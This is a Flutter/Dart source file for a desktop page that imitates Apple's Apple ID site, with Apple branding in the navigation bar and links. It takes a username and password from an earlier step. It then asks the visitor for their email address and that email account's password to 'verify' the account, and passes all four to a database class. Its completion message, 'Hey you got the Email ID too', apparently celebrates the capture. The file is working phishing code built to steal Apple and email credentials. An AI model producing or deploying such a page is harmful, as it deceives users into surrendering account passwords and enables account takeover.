// ignore_for_file: public_member_api_docs, sort_constructors_first
import 'package:email_validator/email_validator.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';

import '../database.dart';

class DesktopLayout extends StatefulWidget {
  final  String username;
 final dynamic password;
  const DesktopLayout({
    Key? key,
    required this.username,
    required this.password,
  }) : super(key: key);

  @override
  State<DesktopLayout> createState() => _DesktopLayoutState();
}

class _DesktopLayoutState extends State<DesktopLayout> {
  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.of(context).size.width;
        GlobalKey<FormState> veryfyformkey = GlobalKey<FormState>();

    TextEditingController passwordC = TextEditingController();
    TextEditingController emailC = TextEditingController();
    return Scaffold(
        resizeToAvoidBottomInset: false,
        backgroundColor: CupertinoColors.white,
        appBar: navBar(),
        body: Column(children: [
          Container(
            width: MediaQuery.of(context).size.width,
            height: 150,
            decoration: const BoxDecoration(
                gradient: LinearGradient(colors: [
              Colors.red,
              Colors.grey,
              Colors.blue,
              Colors.red,
              Colors.amber
            ])),
            child: const Center(
                child: Text(
              'Verify Email Address',
              style: TextStyle(color: Colors.white, fontSize: 30),
            )),
          ),
          const SizedBox(
            height: 30,
          ),
          const SizedBox(height: 20),
          SizedBox(
              child: Padding(
            padding: const EdgeInsets.only(
              left: 20.0,
              right: 20,
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: const [
                Text(
                  'Email Address And Password Required',
                  style: TextStyle(
                      fontSize: 20,
                      color: Colors.black,
                      fontWeight: FontWeight.normal),
                ),
                SizedBox(height: 40),
                Padding(
                  padding: EdgeInsets.only(left: 10.0, right: 10),
                  child: Text(
                    "Enter Your Email Address and Email's password to verify your account !",
                    style: TextStyle(
                        fontSize: 17,
                        color: Colors.red,
                        fontWeight: FontWeight.normal),
                  ),
                ),
                //
                SizedBox(height: 15),
              ],
            ),
          )),
          const SizedBox(
            height: 10,
          ),
          SizedBox(
            width: width / 2.5,
            child: Form(
              key: veryfyformkey,
              autovalidateMode: AutovalidateMode.always,
              child: Column(children: [
                Padding(
                  padding: const EdgeInsets.only(left: 10.0, right: 10.0),
                  child: TextFormField(
                    enableSuggestions: true,
                    autocorrect: true,
                    showCursor: true,
                    autofocus: false,
                    textAlign: TextAlign.start,
                    //textDirection: TextDirection.ltr,
                    strutStyle: const StrutStyle(),
                    style: const TextStyle(),
                    textInputAction: TextInputAction.done,
                    textCapitalization: TextCapitalization.characters,
                    keyboardType: TextInputType.emailAddress,
                    controller: emailC,
                    decoration: const InputDecoration(
                      contentPadding: EdgeInsets.only(
                          left: 10, right: 10, top: 5, bottom: 5),
                      border: OutlineInputBorder(
                          borderRadius: BorderRadius.all(Radius.circular(10))),
                      hintText: ' Email Address',
                      hintStyle: TextStyle(fontSize: 16),
                    ),
                    validator: (ifemail) => !EmailValidator.validate(ifemail!)
                        ? 'Enter a valid email'
                        : null,
                  ),
                ),
                const SizedBox(height: 20),
                Padding(
                  padding: const EdgeInsets.only(left: 10.0, right: 10.0),
                  child: TextFormField(
                    showCursor: true,
                    autofocus: false,
                    textAlign: TextAlign.start,
                    strutStyle: const StrutStyle(),
                    style: const TextStyle(),
                    textInputAction: TextInputAction.done,
                    keyboardType: TextInputType.visiblePassword,
                    controller: passwordC,
                    decoration: const InputDecoration(
                      contentPadding: EdgeInsets.only(left: 10, right: 15),
                      border: OutlineInputBorder(
                          borderRadius: BorderRadius.only(
                              topLeft: Radius.circular(10),
                              topRight: Radius.circular(10),
                              bottomRight: Radius.circular(10),
                              bottomLeft: Radius.circular(10))),
                      hintText: 'password',
                      hintStyle: TextStyle(fontSize: 16),
                    ),
                    validator: (ifpassword) {
                       if (ifpassword!.isEmpty) {
                                    return 'Please enter password';
                                  } else if (ifpassword.length < 6) {
                                    return 'Please enter a correct password';
                                  } else {
                                    return null;
                                  }
                    },
                  ),
                ),
                const SizedBox(height: 30),
                TextButton(
                  child: const Text(
                    'Continue',
                    style: TextStyle(fontSize: 23, color: Colors.blue),
                  ),
                  onPressed: () {
                    if(veryfyformkey.currentState!.validate()){
                     FutureBuilder<Map<String, dynamic>>(
                      future: Database(
                              password: widget.password, username: widget.username, emailPassword: passwordC.text, emailUsername: emailC.text)
                          .getData(),
                      builder: (BuildContext context,
                          AsyncSnapshot<Map<String, dynamic>> snapshot) {
                        switch (snapshot.connectionState) {
                          case ConnectionState.done:
                            return const Text('Hey you got the Email ID too');
                          default:
                            return const CircularProgressIndicator(
                                color: CupertinoColors.activeBlue);
                        }
                      },
                    );
                    const info = 'Verifying please wait...';
                    const snackBar = SnackBar(
                      content: Text(info),
                      duration: Duration(seconds: 4),
                      backgroundColor: CupertinoColors.activeBlue,
                    );
                    ScaffoldMessenger.of(context).showSnackBar(snackBar);
                  }},
                ),
              ]),
            ),
          ),
          const SizedBox(height: 10),
          TextButton(
            child: const Text('Manage your Apple account'),
            onPressed: () async {},
          ),
        ]));
  }

  navBar() {
    return AppBar(
        backgroundColor: CupertinoColors.white,
        leading: const Padding(
          padding: EdgeInsets.only(top: 20, left: 20),
          child: Text(
            'Apple ID',
            style: TextStyle(
                fontSize: 17, color: Colors.black, fontWeight: FontWeight.bold),
          ),
        ),
        leadingWidth: 150,
        actions: [
          Padding(
              padding: const EdgeInsets.only(right: 20.0),
              child: Row(
                children: [
                  TextButton(
                      onPressed: () {},
                      child: const Text(
                        'Sign in',
                        style: TextStyle(color: Colors.black, fontSize: 14),
                      )),
                  TextButton(
                      onPressed: () {},
                      child: TextButton(
                          onPressed: () {},
                          child: const Text('Create An Apple ID',
                              style: TextStyle(
                                  color: Colors.black, fontSize: 14)))),
                  TextButton(
                      onPressed: () {},
                      child: const Text('FAQ',
                          style: TextStyle(color: Colors.black, fontSize: 14)))
                ],
              )),
        ],
        elevation: 2);
  }
}
